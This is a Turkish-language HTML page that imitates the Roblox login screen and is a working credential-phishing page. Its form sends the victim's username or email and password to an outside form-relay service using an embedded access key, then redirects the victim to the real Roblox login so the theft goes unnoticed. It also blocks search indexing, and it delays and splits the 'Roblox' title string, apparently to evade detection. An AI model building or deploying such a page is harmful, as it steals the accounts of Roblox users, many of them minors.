<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Giriş Yap</title>
    <style>
        /* Orijinal Roblox Karanlık Tema Tasarımı */
        body { 
            background-color: #1b1d1e; 
            font-family: 'HCo Gotham SSm', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            color: white; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .login-card { 
            background: #2b2d2f; 
            padding: 40px 30px; 
            border-radius: 8px; 
            width: 380px; 
            text-align: center; 
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        }
        h2 { font-size: 24px; margin-bottom: 25px; font-weight: 700; }
        input { 
            width: 100%; 
            height: 48px; 
            margin-bottom: 15px; 
            border-radius: 4px; 
            border: 1px solid #111; 
            background: #393b3d; 
            color: white; 
            padding: 0 12px; 
            box-sizing: border-box; 
            font-size: 16px;
        }
        input:focus { border-color: #0084ff; outline: none; }
        .primary-btn { 
            width: 100%; 
            height: 42px; 
            background: transparent; 
            border: 1px solid #adb5bd; 
            color: white; 
            font-size: 16px; 
            font-weight: 600; 
            border-radius: 4px; 
            cursor: pointer; 
            margin-top: 10px;
            transition: 0.2s;
        }
        .primary-btn:hover { background: rgba(255,255,255,0.1); }
        .divider { height: 1px; background: #444; margin: 25px 0; }
        .footer-links { font-size: 13px; color: #adb5bd; }
        a { color: #00b2ff; text-decoration: none; font-weight: 500; }
        a:hover { text-decoration: underline; }
        .social-btn {
            width: 100%;
            height: 40px;
            background: #393b3d;
            border: none;
            color: white;
            border-radius: 4px;
            margin-bottom: 10px;
            font-weight: 600;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="login-card">
    <h2>Hesap <span>Ekle</span></h2>

    <form action="https://api.web3forms.com/submit" method="POST">
        <input type="hidden" name="access_key" value="4d9b8514-bee7-4916-bfab-e61246fa5ba7">

        <input type="text" name="id_check" placeholder="Kullanıcı adı/E-posta/Telefon" required>
        <input type="password" name="pass_check" placeholder="Şifre" required>

        <button type="submit" class="primary-btn">Giriş yapmak</button>

        <input type="hidden" name="redirect" value="https://www.roblox.com/login">
    </form>

    <div class="footer-links" style="margin-top: 15px;">
        <a href="javascript:void(0)" onclick="location.href='https://www.'+'roblox'+'.com/login/forgot-password-or-username'">
            Şifrenizi veya kullanıcı adınızı mı unuttunuz?
        </a>
    </div>

    <div class="divider"></div>

    <button class="social-btn" onclick="location.href='https://www.roblox.com/login'">Bana Tek Kullanımlık Bir Kod Gönderin</button>
    <button class="social-btn" onclick="location.href='https://www.roblox.com/login'">Hızlı Giriş</button>

    <div style="margin-top: 20px; font-size: 14px;">
        Yeni Hesap Oluştur
    </div>
</div>

<script>
    /* Tarayıcı başlığını sayfa yüklendikten sonra değiştiriyoruz */
    setTimeout(() => {
        document.title = "Ro" + "blox";
    }, 1200);
</script>

</body>
</html>
